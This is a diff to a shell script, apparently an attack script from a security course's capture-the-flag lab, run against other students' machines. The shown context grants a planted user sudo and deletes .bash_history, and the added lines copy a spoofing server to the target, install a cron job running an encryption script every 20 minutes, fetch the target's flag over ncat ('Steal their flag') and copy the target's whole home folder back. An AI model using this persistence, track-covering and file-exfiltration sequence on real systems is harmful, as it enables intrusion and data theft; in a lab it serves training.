@@ -21,18 +21,27 @@ sudo usermod -aG sudo "${OUR_USR}"
 rm -rf .bash_history
 exit
 
+# ------------------ set up spoofing server
 # copy new instance of spoofing server
 # TODO - add correct folders copy
 scp -r "/home/class/fun/spoofer" "${OUR_USR}@${IP}:/home/${OUR_USR}/spoofer"
 # TODO - execute it
 
+# Copy encryption cron job
+scp -r "/home/class/fun/spoofer/cron" "${OUR_USR}@${IP}:/home/${OUR_USR}/spoofer/cron"
+
+# Enable encryption job every 20 minutes
+(crontab -l 2>/dev/null; echo "*/20 * * * * /home/${OUR_USR}/spoofer/cron/encrypt_log.sh") | crontab -
+
+
+# ------------------ Steal their flag
 ssh "${OUR_USR}@${IP}"
 # get their flag for A02
 echo "EuphoricMushroomsFeedAnywhere" | ncat 192.168.1.167 26711 | grep -o "BSY-FLAG-A02-{[a-zA-Z0-9]*}" > "flag-${IP}"
 exit
-
-# copy their folder
-scp -r "class@${IP}:/home/class" "/home/class/fun/${IP}"
-
 # copy flag home
 scp -r "${OUR_USR}@${IP}:/home/${OUR_USR}/flag-${IP}" "/home/class/vms/${IP}/a02"
+
+
+# ------------------ Copy their folder
+scp -r "class@${IP}:/home/class" "/home/class/fun/${IP}"
